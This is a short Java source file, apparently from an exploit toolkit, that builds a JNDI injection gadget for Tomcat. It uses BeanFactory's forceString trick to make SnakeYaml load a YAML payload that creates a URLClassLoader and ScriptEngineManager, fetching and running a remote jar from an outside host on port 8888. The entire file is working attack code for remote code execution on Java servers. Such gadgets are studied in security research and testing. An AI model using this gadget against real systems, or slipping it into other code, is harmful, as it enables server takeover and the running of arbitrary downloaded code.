package xyz.eki.marshalexp.gadget.jndi;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

public class GSnakeYaml {
    public static ResourceRef tomcat_snakeyaml(){
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://buptmerak.cn:8888/exp.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
